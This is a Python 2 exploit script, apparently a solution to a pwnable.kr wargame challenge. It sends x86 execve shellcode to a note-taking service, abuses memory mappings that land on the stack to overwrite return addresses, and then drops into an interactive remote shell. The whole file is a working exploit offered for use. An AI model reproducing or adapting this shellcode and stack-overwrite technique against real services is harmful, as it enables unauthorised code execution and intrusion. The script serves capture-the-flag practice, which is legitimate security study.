import socket
import time
import sys
import struct
import fcntl
import os

def read_until(word):
    data = ''
    letterIndex = 0
    letter = word[0]
    while word != data:
        character = s.recv(1)
        #sys.stdout.write(character)
        if character == letter:
            data+=character
            letterIndex+=1
            if letterIndex < len(word):
                letter = word[letterIndex]
        else:
            data = ''
            letterIndex = 0
            letter = word[letterIndex]


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('pwnable.kr', 9019))


shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

print '[+] wait 10 sec...'

time.sleep(10)

# store shellcode at mapped address
read_until('exit\n')
s.send('1\n')
read_until('[')
shellcode_address = int(s.recv(8), 16)
print '[+] shellcode at ' + hex(shellcode_address)
read_until('exit\n')
s.send('2\n')
read_until('no?\n')
s.send('0\n')
read_until('byte)\n')
s.send(shellcode + '\n')
read_until('exit\n')


# vulnerability is using MAP_FIXED parameter at random address
# will skip heap/text area due to OR operation with 0x80000000
# BUT stack area not protected so keep mapping until a map overwrites
# stack area (pre-determined because ASLR is turned off) this is also easier
# because select_menu is recursivly called increasing the stack size each time
# once a area on the stack is mapped (mmap will overwrite with zeros) we will
# overwrite the return address for the stack frame with our shellcode
found_mapping = False
first_frame = 0xffffdc48# gonna be different in gdb vs shell
stack_limit = 0x000f0000
stack_frame_size = 1072
current_ebp = first_frame - stack_frame_size*2

print '[+] looking for mapping'
while(not(found_mapping)):
    # Create notes looking for stack mapped address
    for i in range(0,255):
        time.sleep(0.001)
        s.send('1\n')
        read_until('no ')
        note_no = int(s.recv(3).split('\n')[0])
        read_until('[')
        mapped_address = int(s.recv(8), 16)
        read_until('exit\n')
        current_ebp -= stack_frame_size
        print 'address -> ' + hex(mapped_address)
        print 'note no -> ' + str(note_no)
        if (mapped_address < first_frame) and ((mapped_address > (first_frame - stack_limit)) or (mapped_address > current_ebp)):
            #print 'Mapped at stack!'
            print '[+] mapped address -> ' + hex(mapped_address)
            print '[+] note no -> ' + str(note_no)
            found_mapping = True
            break

    if(not(found_mapping)):
        # exhausted note creation, delete notes and start again
        for i in range(1,256):
            time.sleep(0.001)
            s.send('4\n')
            read_until('no?\n')
            s.send(str(i)+'\n')
            read_until('exit\n')
            current_ebp -= stack_frame_size
            print 'note {0} deleted'.format(i)


# now ensure stack has grown large enough to include the found mapped value
# if not just keep calling select_menu to increase stack size untill it crosses over
while(current_ebp > mapped_address):
    print '[+] mapped -> ' + hex(mapped_address) + ', current ebp -> ' + hex(current_ebp)
    s.send('3\n')
    read_until('no?\n')
    s.send(str(note_no) + '\n')
    read_until('exit\n')
    current_ebp -= stack_frame_size


print 'current ebp ->' + hex(current_ebp)

# find first stack frame below mapped address
temp_ebp = current_ebp
while(temp_ebp < mapped_address):
    temp_ebp += stack_frame_size


print 'temp ebp ->' + hex(temp_ebp)
diff_from_mapping = temp_ebp - mapped_address + 4


# now overwrite return pointer on stack frame where we mapped earlier
s.send('2\n')
read_until('no?\n')
s.send(str(note_no) + '\n')
read_until('byte)\n')
#s.send('A'*diff_from_mapping + struct.pack('<I', shellcode_address) + '\n')
s.send('A'*(diff_from_mapping%4) + struct.pack('<I', shellcode_address)*(1024 - diff_from_mapping%4) + '\n')
read_until('exit\n')


# now call exit and it will collapse all the stacks eventually returning to our shellcode
s.send('5\n')
read_until('bye\n')

print 'Heres your shell...'

s.settimeout(0.2)
while(True):
    try:
        time.sleep(0.1)
        sys.stdout.write(s.recv(512))
    except:
        s.send(raw_input() + '\n')





